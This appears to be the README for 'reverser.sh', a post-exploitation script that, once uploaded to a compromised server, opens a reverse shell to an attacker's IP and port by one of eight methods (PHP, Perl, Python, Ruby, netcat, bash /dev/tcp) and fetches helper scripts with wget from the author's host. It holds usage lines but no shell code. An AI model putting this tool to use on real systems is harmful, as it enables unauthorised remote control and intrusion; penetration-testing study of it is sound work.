README FOR REVERSER SCRIPT

NAME: REVERSER.SH
DESC: Quick Reverse Connection Deployment Script
VERSION: 1
AUTHOR: Hood3dRob1n

INSTRUCTIONS:
A) Upload Script to Server
B) chmod +x reverser.sh
C) ./reverser.sh <#1-8> IP PORT

Once launched it will create reverse connection using your method of choice and call home to IP given on designated port. Dont forget to set your local listener up before running!

USAGE: ./reverser.sh <#1-8> IP PORT
EX: ./reverser.sh 6 192.168.1.22 5151

OPTIONS:
 1) Pentestmonkey PHP Reverse Shell
 2) NETCAT with GAPING_SECURITY_HOLE enabled
 3) NETCAT with GAPING_SECURITY_HOLE disabled - Backpipe Method
 4) NETCAT with GAPING_SECURITY_HOLE disabled - FIFO Method
 5) Bash /dev/tcp socket method
 6) Pentestmonkey Perl Reverse Shell
 7) Python Reverse Shell by Pi
 8) MagicC0d3r Ruby Reverse Shell

NOTE: I have hosted the external connection scripts on my own hosting site for general usage. You can download the scripts through github and can host where you like. Simply change line 13 to point to where you put them and possibly alter wget calls as needed or follow the same path conventions on your hosting setup (just place in scripts/ folder on hosting and should be fine)


A FEW CREDITS DUE:
pentestmonkey@pentestmonkey.net for the Perl & PHP based reverse conneciton scripts. I made very minor mods to them to allow processing via scripted method, nothing else. Thanks for an awesome site and lots of neat scripts!

MagicC0d3r for the great Ruby based script!

Pi, my good friend, for the great Python based option!
